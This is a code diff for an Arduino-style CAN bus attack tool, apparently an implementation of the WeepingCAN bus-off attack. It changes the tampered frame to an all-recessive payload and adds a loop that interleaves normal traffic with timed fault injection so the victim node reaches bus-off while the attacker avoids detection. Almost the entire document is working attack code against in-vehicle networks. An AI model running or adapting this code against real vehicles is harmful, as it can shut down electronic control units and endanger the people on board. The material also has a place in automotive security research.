@@ -66,35 +66,37 @@ void setup()
 
   // Fabricate malicious preceding message and tampered
   uint8_t dominant_data_prec[CONFIG.messages.preceding.dlc] = {};
-  uint8_t dominant_data_mali[CONFIG.messages.tampered.dlc] = {};
+  // Now payload is all recessive for WeepingCAN
+  uint8_t recessive_data_mali[CONFIG.messages.tampered.dlc] = {1};
   CanMsg preceding_msg = {CONFIG.messages.preceding.id, CONFIG.messages.preceding.dlc, dominant_data_prec};
-  CanMsg malicious_msg = {CONFIG.messages.tampered.id, CONFIG.messages.tampered.dlc, dominant_data_mali};
+  CanMsg malicious_msg = {CONFIG.messages.tampered.id, CONFIG.messages.tampered.dlc, recessive_data_mali};
   Serial.println("Malicious messages fabricated");
 
-  // Now we sync again and we know with a certain degree of certainty (dependant on the jitter and the number of samples) when the next will be transmitted, based on the information acquired
-  Serial.println("Starting attack");
-  if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
-  {
-    Serial.println("Could not synchronise with message, aborting attack");
-    return;
-  }
-  // We have just received the message to attack so now we have to "come-back" by the length of the attack and by some factor to inject the preceding
-  delayMicroseconds(victim_period - scaleperci(msg_duration_micros(int(CONFIG.can.bitrate), CONFIG.messages.tampered.dlc), CONFIG.sync.scale));
-  // Enqueue messages and inject them
-  attack(preceding_msg, malicious_msg);
-  log_error_counters();
+  // Build array containing "normal messages" as specified by the config
+  CanMsg traffic[CONFIG.messages.traffic_msgs];
 
-  // Now victim should be in error passive so we keep sending to put in bus off
-  for (int tries = 0; tries < CONFIG.attacks; tries++)
+  for (int i = 0; i < CONFIG.messages.traffic_msgs; i++) {
+    traffic[i] = CanMsg(CONFIG.messages.traffic[i].id, CONFIG.messages.traffic[i].dlc, nullptr);
+  }
+
+  // Here it starts the "attack loop", it is different from before since we are interleaving fault injection with normal messages to decrease our TEC faster than the victim
+  for (int tries = 0; tries < CONFIG.iter; tries++)
   {
-    if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
+    // Send normal every CONFIG.period ms
+    delay(CONFIG.period);
+    send_traffic(traffic, CONFIG.messages.traffic_msgs);
+    // Every CONFIG.skip inject the fault
+    if ((tries % CONFIG.skip) == 0)
     {
-      Serial.println("Could not re-sync with message, aborting attack");
-      return;
+      if (!synchronise(CONFIG.messages.tampered.id, CONFIG.sync.tries))
+      {
+        Serial.println("Could not re-sync with message, aborting attack");
+        return;
+      }
+      delayMicroseconds(victim_period - scaleperci(msg_duration_micros(int(CONFIG.can.bitrate), CONFIG.messages.tampered.dlc), CONFIG.sync.scale));
+      // Enqueue messages and inject them
+      attack(preceding_msg, malicious_msg);
     }
-    delayMicroseconds(victim_period - scaleperci(msg_duration_micros(int(CONFIG.can.bitrate), CONFIG.messages.tampered.dlc), CONFIG.sync.scale));
-    // Enqueue messages and inject them
-    attack(preceding_msg, malicious_msg);
     log_error_counters();
   }
 
